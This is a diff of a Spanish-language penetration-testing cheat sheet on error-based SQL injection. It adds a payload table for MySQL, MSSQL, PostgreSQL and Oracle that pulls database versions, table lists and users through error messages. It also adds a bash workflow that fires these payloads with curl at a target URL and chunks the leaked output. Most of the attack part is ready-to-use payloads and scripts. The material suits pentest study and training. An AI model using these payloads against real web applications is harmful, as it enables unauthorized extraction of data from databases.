@@ -1,19 +1,19 @@
 ---
 aliases:
-  - "Error-Based SQL Injection"
-  - "Error-based SQLi"
+  - Error-Based SQL Injection
+  - Error-based SQLi
 tags:
   - type/technique
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[SQL Injection (SQLi)]]"
+  - '[[SQL Injection (SQLi)]]'
 ---
 # SQLi - Error based
 
@@ -21,28 +21,60 @@ linked:
 
 ## Cheatsheet
 
-|      **SGBD**      | **Función / Vector** |                                **Payload Estructural**                                 | **Notas de Exfiltración**                                                                                                     |
-|:------------------:|:--------------------:|:--------------------------------------------------------------------------------------:| ----------------------------------------------------------------------------------------------------------------------------- |
-|   <br>**MySQL**    | <br>`EXTRACTVALUE()` |             <br>`AND extractvalue(rand(),concat(0x3a,(SELECT version())))`             | <br>Límite de 32 caracteres por error. Retorna el resultado en el mensaje de validación XPath.<br><br>                        |
-|   <br>**MySQL**    |  <br>`UPDATEXML()`   |           <br>`AND updatexml(rand(),concat(0x3a,(SELECT version())),rand())`           | <br>Límite de 32 caracteres. Alternativa directa a extractvalue.<br><br>                                                      |
-|   <br>**MSSQL**    |   <br>`CONVERT()`    |                  <br>`AND 1=(SELECT CONVERT(int,(SELECT @@version)))`                  | <br>Fuerza un error de conversión de tipos (ej. de varchar a int). El valor exfiltrado aparece en el error de casteo.<br><br> |
-|   <br>**MSSQL**    |     <br>`CAST()`     |                      <br>`AND 1=CAST((SELECT @@version) AS int)`                       | <br>Mecanismo homólogo a CONVERT.                                                                                             |
-| <br>**PostgreSQL** |     <br>`CAST()`     |                    <br>`AND 1=CAST((SELECT version()) AS numeric)`                     | Error al intentar convertir una cadena de texto a un valor numérico.<br><br>                                                  |
-|   <br>**Oracle**   |   <br>`UTL_INADDR`   | <br>`AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))` | <br>El error se genera al fallar la resolución DNS de un hostname compuesto por la subconsulta.<br><br>                       |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -` | Versión MySQL embebida en mensaje XPath error | MySQL <8.0 + errores expuestos. Límite 32 chars output. |
+| `' AND updatexml(rand(),concat(0x3a,(SELECT version())),rand())-- -` | Mismo via `UPDATEXML` | Alt cuando `extractvalue` filtrado. |
+| `' AND extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -` | Lista de tablas en error | MySQL. Chunk si excede 32 chars con `SUBSTRING`. |
+| `' AND extractvalue(rand(),concat(0x3a,(SELECT SUBSTRING(group_concat(table_name),1,30) FROM information_schema.tables WHERE table_schema=database())))-- -` | Primeros 30 chars del listado de tablas | Workaround del límite 32. |
+| `' AND 1=(SELECT CONVERT(int,(SELECT @@version)))-- -` | Versión MSSQL en error de conversion | MSSQL con errores expuestos. |
+| `' AND 1=CAST((SELECT @@version) AS int)-- -` | Mismo via `CAST` | Alt MSSQL. |
+| `' AND 1=CAST((SELECT version()) AS numeric)-- -` | Versión PostgreSQL en error | PostgreSQL. |
+| `' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS numeric)-- -` | Lista tablas PostgreSQL en error | Equivalente group_concat. |
+| `' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- -` | Banner Oracle en error DNS | Oracle (privs UTL_INADDR). |
+| `' AND 1=(SELECT 1 FROM xmltype(concat('<a>',(SELECT user FROM dual),'</a>')))-- -` | User Oracle en error XML | Oracle alt sin UTL_INADDR. |
 ^sqli-error
+
+### Workflow
+
+```bash
+TARGET="https://target/items?id=1"
+
+# 1. Identificar SGBD por error message
+curl -s "$TARGET'" | grep -iE 'mysql|mariadb|mssql|sql server|postgresql|oracle|ora-'
+
+# 2. MySQL — extractvalue chain
+PAYLOADS=(
+  "' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -"
+  "' AND extractvalue(rand(),concat(0x3a,(SELECT database())))-- -"
+  "' AND extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"
+)
+
+for p in "${PAYLOADS[@]}"; do
+  ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$p'))")
+  echo "=== $p ==="
+  curl -s "$TARGET$ENC" | grep -oE "XPATH syntax error:[^<]*"
+done
+
+# 3. Chunking — si excede 32 chars
+for i in 1 33 65 97; do
+  P="' AND extractvalue(rand(),concat(0x3a,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),$i,32)))-- -"
+  curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$P'))")" | grep -oE "XPATH syntax error:[^<]*"
+done
+```
 
 ___
 
 ## Overview
 
-El [[Error-based SQLi]] es una técnica de inyección de tipo In-Band donde dependo de los mensajes de error emitidos por el motor de la base de datos para exfiltrar información sobre su estructura o el contenido de sus tablas. A diferencia del [[Union-based SQLi]], no requiero que el resultado de mi consulta se refleje de manera natural en el cuerpo de la respuesta web, sino que fuerzo una excepción lógica, matemática o sintáctica cuyo volcado de error incluya los datos procesados de mi subconsulta.
+**Error-based SQLi** = forzar al SGBD a arrojar errores verbose que contengan los datos exfiltrados. Vector In-Band alternativo a [[SQLi - Union based]] cuando UNION no es viable (frontend no refleja, columnas no compatibles).
 
-La viabilidad de este vector está estrictamente condicionada a la configuración del entorno: requiere que la aplicación web no maneje las excepciones de forma segura y exponga los errores crudos del SGBD (verbose errors) en el frontend o en las respuestas HTTP.
+**Pre-requisito crítico:** errores SQL llegan al cliente sin filtrar. Apps con custom error handling = vector muerto.
 
-### Mecanismos de Acción
-
-- **Errores de Conversión (Type Casting):** Intento convertir deliberadamente una cadena de texto (que evalúa mi consulta inyectada) en un tipo de dato incompatible, usualmente un entero. El motor arrojará una excepción indicando que "no se pudo convertir la cadena 'MIS_DATOS_EXFILTRADOS' al tipo int", revelando así la información.
-- **Errores de Evaluación XPath:** En motores como MySQL, empleo funciones que procesan XML inyectando subconsultas en parámetros que esperan rutas XPath válidas. Al concatenar un carácter inválido (como `0x3a` o `:`) seguido de la consulta, la validación falla y devuelve la ruta procesada como parte del mensaje de error.
-
+**Por motor:**
+- **MySQL**: `extractvalue`/`updatexml` con XPath syntax (límite 32 chars).
+- **MSSQL**: `CONVERT`/`CAST` to int forzando type mismatch.
+- **PostgreSQL**: `CAST as numeric` con string.
+- **Oracle**: `UTL_INADDR.get_host_address` o `xmltype`.
 
 ***
